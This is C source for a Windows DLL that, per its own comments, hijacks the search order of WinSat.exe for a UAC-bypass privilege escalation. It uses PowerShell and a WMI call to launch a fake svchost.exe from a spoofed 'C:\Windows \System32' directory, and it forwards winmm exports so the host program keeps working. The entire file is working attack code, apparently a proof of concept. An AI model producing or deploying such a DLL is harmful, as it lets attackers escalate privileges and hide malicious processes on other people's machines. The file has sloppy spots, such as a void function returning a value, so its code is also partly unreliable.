//This dll is for search order hijacking of the legitimate WinSat.exe from system32. 
//This does two things: it attempts priv esc with UAC bypass if the user is an admin
//It also launches powershell to launch a wmi method to spawn a fake svchost.exe located in a directory with a prefixed space using DOS paths.

#pragma comment(lib,"WS2_32")
#define MMNOTIMER
#include <windows.h>
#include <stdlib.h>
#include <tchar.h>
static HMODULE winmm;
static MMRESULT(*timeBeginPeriod_real)(UINT uPeriod);
static MMRESULT(*timeEndPeriod_real)(UINT uPeriod);

void stage2()
{
    HINSTANCE hInst;
    WSADATA wsaData;
    wchar_t cmd[] = L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    wchar_t arg[] = L" -C Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \'\\\\?\\C:\\Windows \\System32\\svchost.exe\'";
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    BOOL OK = CreateProcessW(cmd, arg, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi); //This is used to execute a process with arguments
    if (OK)// check if Process is created
    {
        //Wait forever till Process object is signaled (terminated)
        DWORD status = WaitForSingleObject(pi.hProcess, INFINITE);
        if (status == WAIT_OBJECT_0)//The state of the specified object is signaled.
        {}
        CloseHandle(pi.hProcess);//Handles must be explicitly closed if not parent process will hold on to it even if child process is terminated.
        CloseHandle(pi.hThread);
    }else{
        MessageBoxW(NULL, L"err5", L"Hijacker", MB_OK);
    }
    if (WSAStartup(0x101, &wsaData) != 0)
        return -1;
    WSACleanup();
}

__declspec(dllexport)
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    (void)hinstDLL;
    (void)lpvReserved;
    if (fdwReason == DLL_PROCESS_ATTACH)
    {
        HANDLE token;
        TOKEN_ELEVATION token_elevation;
        DWORD token_elevation_size;
        MessageBoxW(NULL, L"DLL has been attached to the process", L"Hijacker", MB_OK);
        stage2();
        OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token);
        token_elevation_size = sizeof(token_elevation);
        GetTokenInformation(token, TokenElevation, &token_elevation, sizeof(token_elevation), &token_elevation_size);
        CloseHandle(token);
        if (token_elevation.TokenIsElevated)
        {
            MessageBoxW(NULL, L"DLL is running within an elevated process", L"Hijacker", MB_OK);
        }
        winmm = LoadLibraryW(L"C:\\Windows\\System32\\winmm.dll");
        timeBeginPeriod_real = (MMRESULT(*)(UINT)) GetProcAddress(winmm, "timeBeginPeriod");
        timeEndPeriod_real = (MMRESULT(*)(UINT)) GetProcAddress(winmm, "timeEndPeriod");
    }
    else if (fdwReason == DLL_PROCESS_DETACH)
    {
        FreeLibrary(winmm);
    }
}

__declspec(dllexport)
MMRESULT WINAPI timeBeginPeriod(UINT uPeriod)
{
    return timeBeginPeriod_real(uPeriod);
}

__declspec(dllexport)
MMRESULT WINAPI timeEndPeriod(UINT uPeriod)
{
    return timeEndPeriod_real(uPeriod);
}
